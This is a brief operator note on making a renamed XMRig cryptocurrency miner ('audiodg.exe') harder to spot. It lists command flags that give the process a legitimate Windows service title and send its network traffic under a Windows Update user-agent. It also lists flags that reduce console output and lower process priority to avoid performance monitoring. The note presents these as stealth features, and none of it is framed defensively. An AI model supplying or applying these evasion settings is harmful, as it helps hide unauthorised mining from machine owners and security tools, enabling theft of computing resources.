TASK MANAGER STEALTH IMPROVEMENTS
How the Miner Appears in Task Manager After Updates
================================================================================================

PROBLEM:
--------
Task Manager was showing "XMRig Miner" in the description field, even though the executable
was renamed to "audiodg.exe". This happened because the executable's internal metadata
(Product Name, File Description) still contained the original "XMRig" information.

SOLUTION IMPLEMENTED:
---------------------
We've added the --title flag to disguise the process name that appears in Task Manager.

NEW STEALTH FEATURES:
---------------------
1. Process Title Changed
   - Command: --title="Windows Audio Device Graph Isolation"
   - This makes Task Manager show a legitimate Windows service name
   - The real Windows "audiodg.exe" uses this exact description

2. Network Traffic Disguised
   - Command: --user-agent="Windows-Update-Client/10.0"
   - Network monitoring tools will see legitimate Windows Update traffic
   - Makes the connection appear as system update activity

3. Reduced Output
   - Command: --no-color --print-time=60
   - Minimal console output
   - Less frequent status updates

4. Lower Process Priority
   - Set to "BelowNormal" priority
   - Makes it less noticeable in performance monitoring
   - Reduces system impact
